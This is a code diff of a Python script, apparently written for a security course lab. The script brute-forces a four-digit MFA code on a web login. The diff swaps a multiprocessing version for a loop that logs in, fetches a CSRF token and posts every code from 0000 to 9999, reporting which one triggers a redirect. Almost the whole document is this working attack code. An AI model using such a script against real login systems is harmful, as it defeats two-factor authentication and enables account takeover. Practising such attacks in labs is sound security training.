@@ -30,27 +30,7 @@ def time_decorator(func):
       print(f'Function returned: {return_vals}')
       return(elapsed)
   return(inner)
-
-# Sets up multiprocessing so this can be solved quickly and more efficiently
-@time_decorator
-def getMulti():
-    proc = multiprocessing.Pool(multiCPUProc*countCPU)
-    manager = multiprocessing.Manager()
-    event = manager.Event()
-
-    auth_code = []
-    for i in range(0, 10000):
-            auth_code.append('%04d' % i)
-        
-    for i in range(10000):
-        proc.apply_async(attack_auth, (auth_code[i], event))
-    
-    proc.close()
-
-    event.wait()
-    proc.terminate()
   
-
 
 #Does the bascic login functionality that was given in Code labs
 def login_user(s):
@@ -73,28 +53,26 @@ def login_user(s):
     return csrf
 
 #Checks if the Auth Code given from get_multi is correct or not. If it is not correct than it tries the next code
-def attack_auth(auth_code, event):
+def attack_auth():
     s = requests.Session()
+    
+    for i in range(0, 10000):
+        csrf = login_user(s)
 
-    csrf = login_user(s)
+        login2data = {
+            'csrf' : csrf,
+            'mfa-code' : str(i).zfill(4)
+        }
 
-    login2data = {
-        'csrf' : csrf,
-        'mfa-code' : 5850
-    }
-
-    resp = s.post(login2_url, data=login2data, allow_redirects=False)
-    if resp.status_code == 200:
-        print(f'   +{auth_code} INCORRECT')
-    if resp.status_code == 302:
-        print('==============================')
-        print(f'== CORRECT CODE: {auth_code} ==')
-        print('==============================')
-        event.wait()
+        resp = s.post(login2_url, data=login2data, allow_redirects=False)
+        if resp.status_code == 200:
+            print(f'{str(i).zfill(4) } || {resp.status_code}')
+        if resp.status_code == 302:
+            print(f'{str(i).zfill(4) } || {resp.status_code}')
+            
 
 
 if __name__ == '__main__':
-    time_elapsed = getMulti()
-    print(f'Time: {time_elapsed:0.2f} seconds')
+    attack_auth()
 
     
